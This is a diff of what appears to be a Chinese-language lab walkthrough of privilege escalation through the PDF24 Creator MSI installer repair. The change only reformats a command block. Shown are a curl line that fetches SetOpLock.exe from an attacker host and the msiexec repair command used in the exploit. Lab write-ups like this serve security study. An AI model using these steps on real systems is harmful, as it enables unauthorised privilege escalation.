@@ -427,8 +427,9 @@ C:\Users\gale.dekarios>curl http://10.10.14.190:5001/SetOpLock.exe -o SetOpLock.
 ##### 这个窗口会一直停留
 #### 安装好Oplock后，我们打开一个新的命令shell，并使用脆弱的PDF24 MSI安装程序。
 ```
-C:\Users\gale.dekarios>cd c:\_install                                                                                                                                                                                 c:\_install>msiexec.exe /fa c:\_install\pdf24-creator-11.15.1-x64.msi                                                                                                                         
-```
+C:\Users\gale.dekarios>cd c:\_install                                                                                 
+c:\_install>msiexec.exe /fa c:\_install\pdf24-creator-11.15.1-x64.msi
+```                                                                                                      
 ![图片](image/121506.png)
 #### 什么也阻止不了我安装 一直OK,OK. 
 ![图片](image/121507.png)
